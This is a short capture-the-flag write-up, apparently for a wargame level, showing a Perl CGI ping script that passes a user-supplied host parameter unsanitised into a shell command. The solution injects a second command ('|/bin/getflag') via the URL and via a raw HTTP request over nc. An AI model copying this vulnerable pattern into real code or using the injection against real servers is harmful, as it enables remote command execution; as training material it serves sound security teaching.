# Level07

#### About

The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. 
To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07. 


#### Source Code

```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
	$host = $_[0];

	print("<html><head><title>Ping results</title></head><body><pre>");

	@output = `ping -c 3 $host 2>&1`;
	foreach $line (@output) { print "$line"; } 

	print("</pre></body></html>");
	
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

#### Solutions

http://level07-sevrer:7007/index.cgi?Host=127.0.0.1|/bin/getflag
```
cat /home/flag07/thttpd.conf ----> port=7007
nc -v level07-server 7007
GET /index.cgi?Host=127.0.0.1|/bin/getflag HTTP/1.0
```

